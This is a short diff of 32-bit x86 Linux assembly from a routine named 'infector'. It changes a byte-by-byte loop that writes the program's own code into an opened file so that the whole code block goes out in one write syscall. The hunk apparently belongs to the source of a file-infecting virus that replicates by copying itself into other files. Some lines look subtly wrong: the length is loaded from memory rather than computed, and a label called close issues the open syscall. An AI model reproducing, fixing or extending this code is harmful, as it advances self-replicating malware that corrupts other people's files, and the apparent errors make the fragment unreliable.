@@ -85,13 +85,13 @@ infector:
         mov eax, 4
         mov ebx, [ebp-4]
         mov ecx, [write_address]
-        mov edx, 1
+        mov edx, [code_end - code_start]
         int 0x80
 
-        inc byte [write_address]
+        ;inc byte [write_address]
 
-        cmp dword [write_address], code_end
-        jnz .write
+        ;cmp dword [write_address], code_end
+        ;jnz .write
     
     .close:
         mov eax, 5
